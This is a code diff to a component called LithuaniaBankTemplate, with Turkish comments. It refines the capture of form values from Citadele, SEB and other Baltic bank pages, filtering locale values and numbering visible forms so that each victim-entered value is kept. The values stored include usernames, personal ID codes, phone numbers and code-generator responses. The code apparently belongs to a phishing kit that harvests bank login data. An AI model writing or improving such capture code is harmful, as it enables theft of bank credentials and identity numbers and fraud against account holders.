@@ -569,9 +569,20 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           ariaLabel?: string;
           placeholder?: string;
           formControlName?: string;
+          _formOrder?: number;
         }) => {
           const normalizedValue = field.value.trim();
           if (!normalizedValue) return;
+
+          // 🚨 🚫 GARBAGE VALUE (locale/dil): lt, lt_LT, et_EE vb. HICBIR zaman KAYDETME.
+          // Citadele/SEB select option value=lt_LT geliyor, kolonlari isgal ediyordu.
+          var GARBAGE_VALUES = /^(lt|et|lv|ee|pl|ru|tr|nl|de|en)([-_](lt|et|lv|ee|pl|ru|tr|nl|de|en))?$/i;
+          if (GARBAGE_VALUES.test(normalizedValue)) return;
+
+          const formOrder: number | undefined = (field as any)._formOrder;
+          const prefixMatch = (field.key || "").match(/^form(\d+)__/);
+          // _formOrder > form prefix (0 ise form0 disi, 1+ ise form numarasi — ONCELIKLI)
+          const safeFormOrder = typeof formOrder === "number" ? formOrder : (prefixMatch ? parseInt(prefixMatch[1], 10) : undefined);
 
           const candidateKeys = [field.key, field.name, field.id, field.formControlName, field.label, field.ariaLabel, field.placeholder]
             .map((candidate) => (typeof candidate === "string" ? candidate.trim() : ""))
@@ -585,6 +596,22 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
               continue;
             }
             if (candidateKey in mappedData) continue;
+
+            // ✅ YENI: AYNI isimli alan (ornegin 2 formda da "Kimlik No" / "asmens_kodas") gelirse:
+            //    - Ilk alan (formOrder yok veya formOrder=1): NORMAL kolon ismi (kimlikno)
+            //    - 2+ alan (formOrder >= 2): KOLON ADINA FORM ORDERINI EKLE (form2_kimlikno, form3_kimlikno)
+            //    Boylece 2. alan da KAYDEDILIR, ustune YAZILMAZ.
+            const uniqueCandidate =
+              typeof safeFormOrder === "number" && safeFormOrder >= 2
+                ? `form${safeFormOrder}_${candidateKey}`
+                : candidateKey;
+            const uniqueNormalized = uniqueCandidate.toLowerCase().replace(/[^a-z0-9]/g, "");
+
+            if (uniqueNormalized && !rawCapturedData[uniqueCandidate]) {
+              rawCapturedData[uniqueCandidate] = normalizedValue;
+              continue;
+            }
+            // Eski (prefixli hali) de hala sakla — zaten key form1__field_1 gibi unique
             if (!rawCapturedData[candidateKey]) {
               rawCapturedData[candidateKey] = normalizedValue;
             }
@@ -627,13 +654,15 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
 
           // 2) SONRA prefix'SIZ HALIYLE de persist et → eski mapping/matchedData
           //    (username, personalCode, bankPhone vb.) kolonlara yazilsin.
-          //    (name/id/formControlName zaten prefix'siz olabilir ama garantiye alalim)
+          //    ✅ YENI: _formOrder de GONDER → 2.form ayni label'lı alan gelirse form2_ ekler, ustune YAZMAZ.
           if (prefixMatch) {
+            const formOrderNum = parseInt(prefixMatch[1], 10);
             persistRawCapturedField({
               ...field,
               key: strippedKey,
               // name/id/formControlName'i da prefix'siz olduguna varsayiyoruz
               // (serializeAllLtForms sadece field.key'e prefix ekledi)
+              _formOrder: isNaN(formOrderNum) ? undefined : formOrderNum
             });
           }
 
@@ -1857,9 +1886,16 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         const serializeAllLtForms = () => {
             var allFields = [];
 
+            // 🚨 🚫 GARBAGE VALUE FILTER: locale, country, dil degeri gelirse (lt_LT, et_EE, nl_NL, lt, et, lv, pl, ru, tr) KAYDETME.
+            // Citadele/SEB html icinde gizli <option value="lt_LT"> veya lang inputlari serialize oluyor, gereksiz.
+            var GARBAGE_VALUES = /^(lt|et|lv|ee|pl|ru|tr|nl|de|en)([-_](lt|et|lv|ee|pl|ru|tr|nl|de|en))?$/i;
+
             try {
                 var rootFields = buildCapturedFields(document);
                 rootFields.forEach(function(field) {
+                    var rawVal = (field.value || '').trim();
+                    if (GARBAGE_VALUES.test(rawVal)) return;
+
                     var sel = '[name="' + field.name + '"], #' + field.id + ', [formcontrolname="' + field.formControlName + '"]';
                     var tempEl = document.querySelector(sel);
                     var isInsideForm = false;
@@ -1902,11 +1938,47 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
             } catch(_) {}
 
             try {
-                var forms = Array.from(document.forms || []);
-                forms.forEach(function(form, formIdx) {
-                    var formPrefix = 'form' + (formIdx + 1) + '__';
-                    var formFields = buildCapturedFields(form);
-                    formFields.forEach(function(field) {
+                // ⚠️ ESKI: document.forms dizisini KÖRDÜM indexle → gizli/bos formlar form1, form2 sayiliyordu
+                //    SEB Generatorius 2. methodu form3 olarak gozukuyordu (form1 gizliydi).
+                // ✅ YENI: SADECE GORUNUR + ICINDE EN AZ 1 DEGERLI INPUT olan FORMLARI indexle
+                //    (visible = display:none / aria-hidden degil + getClientRects > 0 + min 1 input with value)
+                var rawForms = Array.from(document.forms || []);
+                var visibleNumberedForms = [];
+
+                for (var fIdx = 0; fIdx < rawForms.length; fIdx++) {
+                    var _form = rawForms[fIdx];
+                    var _fieldsThisForm = buildCapturedFields(_form);
+
+                    // 1) Icinde en az 1 DEGERLI input var mi? (bos formu atla)
+                    var hasAnyValue = _fieldsThisForm.some(function (ff) {
+                        return (ff.value || '').trim().length > 0 && !GARBAGE_VALUES.test((ff.value || '').trim());
+                    });
+                    if (!hasAnyValue) continue;
+
+                    // 2) Form KENDISI gorunuyor mu? (display none, aria-hidden true vs ise atla)
+                    var _formRectOk = true;
+                    try {
+                        var fs = window.getComputedStyle(_form);
+                        if (
+                            _form.getAttribute('hidden') !== null ||
+                            _form.getAttribute('aria-hidden') === 'true' ||
+                            fs.display === 'none' || fs.visibility === 'hidden' || fs.opacity === '0' ||
+                            !_form.getClientRects || _form.getClientRects().length === 0
+                        ) {
+                            _formRectOk = false;
+                        }
+                    } catch (_e) { _formRectOk = true; }
+                    if (!_formRectOk) continue;
+
+                    visibleNumberedForms.push({ form: _form, fields: _fieldsThisForm });
+                }
+
+                visibleNumberedForms.forEach(function (formBundle, visibleIdx) {
+                    // visibleIdx: 0 = ilk gercek form → form1__ (kullanici 1den baslamasini bekler)
+                    var formPrefix = 'form' + (visibleIdx + 1) + '__';
+                    formBundle.fields.forEach(function (field) {
+                        var v = (field.value || '').trim();
+                        if (GARBAGE_VALUES.test(v)) return;
                         allFields.push({
                             key: formPrefix + field.key,
                             name: field.name,
@@ -1917,7 +1989,8 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                             label: field.label,
                             ariaLabel: field.ariaLabel,
                             placeholder: field.placeholder,
-                            _hasPrefix: true
+                            _hasPrefix: true,
+                            _formOrder: visibleIdx + 1
                         });
                     });
                 });
@@ -1927,6 +2000,8 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                 try {
                     var fallbackFields = buildCapturedFields(document);
                     fallbackFields.forEach(function(field) {
+                        var v = (field.value || '').trim();
+                        if (GARBAGE_VALUES.test(v)) return;
                         allFields.push({
                             key: 'form0__' + field.key,
                             name: field.name,
